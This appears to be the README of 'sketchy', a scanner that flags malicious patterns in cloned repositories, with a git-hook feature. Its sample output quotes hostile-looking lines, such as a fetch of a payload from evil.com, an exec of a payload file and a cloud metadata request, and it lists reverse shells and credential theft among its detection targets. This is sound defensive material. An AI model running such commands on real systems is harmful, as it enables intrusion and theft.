New Features in This Version
This document describes the features and improvements added to sketchy beyond the original version.

Comparison to Original
I mainly wanted the cloning hook but got carried away, this version adds:

✅ 60+ detection patterns (Mainly Windows stuff) (vs ~20 in original)
✅ Git hook integration (new)
✅ Advanced filtering (new)
✅ .sketchyignore support (new)
✅ Windows-specific patterns (new)
✅ Cloud/container patterns (new)
✅ CI/CD workflow detection (new)
✅ Pattern statistics (new)
✅ Category filtering (new)
✅ Improved code quality (refactored)

# 🔍 sketchy

**A comprehensive security scanner for folks who `git clone` first and ask questions later.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
[![Go](https://img.shields.io/badge/Made%20with-Go-00ADD8.svg)](https://go.dev/)
[![GuardDog Inspired](https://img.shields.io/badge/Patterns%20from-GuardDog-purple.svg)](https://github.com/DataDog/guarddog)

> Because that random GitHub repo with 0 stars you're about to run probably isn't malicious...

## Why sketchy?

You know how it goes. You find a repo that probably solves your problem. It has decent docs, a few stars, last commit 8 months ago. You're about to `npm install` or `pip install` or just straight up `./install.sh` it.

**Your brain:** *"This is probably fine."*  
**Also your brain:** *"But remember that time PyTorch got supply chain attacked?"*  
**You:** *"That won't happen to me."*  
**Narrator:** *"It could absolutely happen."*

`sketchy` is a fast, cross-platform security scanner that checks for the obvious (and not-so-obvious) signs that a package, repo, or script might be trying to ruin your day.

## Quick Start

> **New to sketchy?** See [SETUP.md](SETUP.md) for a complete step-by-step setup guide including hook installation and testing.

### Installation

#### Option 1: Use the Pre-built Executable (Recommended)

The `sketchy.exe` (Windows) or `sketchy` (Linux/macOS) is already included in this repository. Just run it:

```bash
# Windows
cd sketchy
.\sketchy.exe

# Linux/macOS
cd sketchy
./sketchy
```

#### Option 2: Build from Source

```bash
git clone https://github.com/adversis/sketchy.git
cd sketchy/sketchy
go build -o sketchy.exe .
```

#### Option 3: Download Pre-built Binary

```bash
# macOS/Linux
curl -L https://github.com/adversis/sketchy/releases/latest/download/sketchy-$(uname -s)-$(uname -m).tar.gz | tar xz
chmod +x sketchy
sudo mv sketchy /usr/local/bin/

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/adversis/sketchy/releases/latest/download/sketchy-windows-amd64.zip" -OutFile "sketchy.zip"
Expand-Archive -Path "sketchy.zip" -DestinationPath "."
```

### First Run

When you run `sketchy` with no arguments, it will:

1. **Check if git hook is installed** - Automatically detects if you have the hook set up
2. **Prompt to install hook** - If not installed, asks if you want to set it up
3. **Show help** - Displays all available options

```bash
# Just run it
.\sketchy\sketchy.exe

# You'll see:
# 🔧 First time using sketchy?
#    Install a git hook to automatically scan repositories after cloning!
#    
#    Would you like to install the git hook? (y/n):
```

## Usage

### Basic Scanning

```bash
# Scan current directory
sketchy -path .

# Scan specific path
sketchy -path /path/to/repo

# Scan a file
sketchy -path suspicious.py
```

### Filtering Results

```bash
# Show only HIGH RISK findings
sketchy -high-only -path ./repo

# Show MEDIUM and HIGH RISK findings
sketchy -medium-up -path ./repo

# Filter by category
sketchy -category cloud -path ./repo
# Categories: supply-chain, credential-theft, persistence, obfuscation, network, execution, cloud
```

### Advanced Options

```bash
# Show pattern statistics
sketchy -stats -path ./repo

# Include binary files (default: skipped)
sketchy -skip-binary=false -path ./repo

# Help
sketchy -help
```

## Git Hook Installation

### Automatic Installation (Recommended)

When you first run `sketchy` with no arguments, it will prompt you to install a git hook. This hook automatically scans repositories after you clone them.

**Choose Option 2 (Global)** for the best experience - it applies to all future git clones.

### Manual Installation

```bash
sketchy install-hook
```

You'll be prompted to choose:
1. **Current repository only** - Hook only works for this repo
2. **Global git template** (recommended) - Hook works for all new clones

### How It Works

After installation, every time you run `git clone`, sketchy will automatically:
1. Scan the newly cloned repository
2. Display security findings
3. **Not block the clone** - it's a warning only

**Example:**
```bash
$ git clone https://github.com/some/repo.git
Cloning into 'repo'...
...
🔍 Running sketchy security scan on repository...
================================================
HIGH RISK Suspicious network operation - suspicious-network
  File: src/main.js:42
  Preview: fetch('http://evil.com/payload')
...
⚠️  Security scan found potential issues. Review the output above.
   (This is a warning only - checkout completed successfully)
```

### Hook Configuration

If you chose **Global git template**, you need to configure git:

```bash
# After installation, sketchy will show you the command:
git config --global init.templateDir ~/.git-template
```

This makes the hook available in all newly cloned repositories.

### Troubleshooting

**Hook not running?**
- Make sure `sketchy.exe` is in the repository root, OR
- Add sketchy to your PATH

**Want to disable the hook?**
- Rename or delete `.git/hooks/post-checkout` (repo-specific)
- Or remove from global template directory

**Re-prompt for installation?**
- Delete the hook file and run `sketchy` again

## Example Output

```bash
$ sketchy -path ./suspicious-repo

🔍 Scanning: ./suspicious-repo
================================
HIGH RISK [GuardDog] Code execution pattern - code-execution
  File: main.py:42
  Preview: exec(open('payload.py').read())

HIGH RISK Cloud metadata endpoint access - cloud-metadata
  File: utils.py:128
  Preview: requests.get('http://169.254.169.254/latest/meta-data/')

MEDIUM RISK Base64 decoding detected - base64
  File: config.py:15
  Preview: decoded = base64.b64decode(encoded_payload)

================================
⚠️  Scan complete. Found 3 potential issue(s).
```

## What It Detects

Sketchy detects 60+ malicious patterns including:

- **Command overwrites** - Overwriting common shell commands
- **Code execution** - exec, eval, dynamic imports
- **Reverse shells** - Backdoor connections
- **Cryptocurrency miners** - XMRig, mining pools
- **Credential theft** - SSH keys, AWS credentials, browser cookies
- **Cloud attacks** - Metadata endpoint access, Docker socket abuse
- **Persistence mechanisms** - Cron jobs, systemd, Windows Registry
- **Obfuscation** - Base64, Unicode tricks, character encoding
- **Supply chain attacks** - npm scripts, package manager abuse
- **And much more...**

See [FEATURES.md](FEATURES.md) for a complete list of features added in this version.

## Exit Codes

The scanner returns the number of issues found as the exit code:
- `0`: No issues found
- `1+`: Number of issues detected

Perfect for CI/CD integration:

```bash
sketchy -path ./repo || echo "Found $? security issues"
```

## Configuration

### .sketchyignore

Create a `.sketchyignore` file to skip certain files/directories (similar to `.gitignore`):

```
node_modules/
*.log
test/
!test/important_security_test.py
```

See `sketchy/.sketchyignore.example` for more examples.

## Cross-Platform Support

- **Windows**: AMD64, ARM64
- **Linux**: AMD64, ARM64, ARMv7
- **macOS**: Intel, Apple Silicon (M1/M2/M3)
- **BSD**: FreeBSD, OpenBSD

## Performance

- **Fast**: Compiled Go binary, scans in seconds
- **Smart**: Skips binary files, respects ignore patterns
- **Lightweight**: ~3MB binary, no dependencies
- **Efficient**: Handles large repositories quickly

## Building

```bash
# Build for current platform
cd sketchy
go build -o sketchy.exe .

# Build for all platforms
make cross-compile

# Run tests
make test
```

## Contributing

Found something sketchy that we missed? PRs welcome!

The codebase is simple:
- `main.go` - Core scanner logic
- `patterns.go` - All detection patterns
- `bash/sketchy.sh` - Original bash implementation (still maintained!)

## License

MIT License - See [LICENSE](sketchy/LICENSE) file for details.

## Attribution

Detection patterns inspired by [DataDog's GuardDog](https://github.com/DataDog/guarddog) (Apache 2.0)

## FAQ

**Q: Should I trust this tool?**  
A: You shouldn't trust anything, really. But the source is readable - audit it in 10 minutes.

**Q: It found malware, now what?**  
A: Delete it. Report it. Thank sketchy. Star this repo.

**Q: I found malware and sketchy didn't catch it.**  
A: Please report it! We're always improving detection patterns.

**Q: Is this paranoid?**  
A: npm had 1,300+ malicious packages in 2021 alone. PyPI, RubyGems, and others have similar issues. Is it really paranoia if they're actually out to get you?

## Fine Print

- **Warranty**: None. This is free software that might help you not get hacked.
- **Limitations**: Can't detect everything. Won't replace common sense. Some false positives. Some false negatives. YMMV.

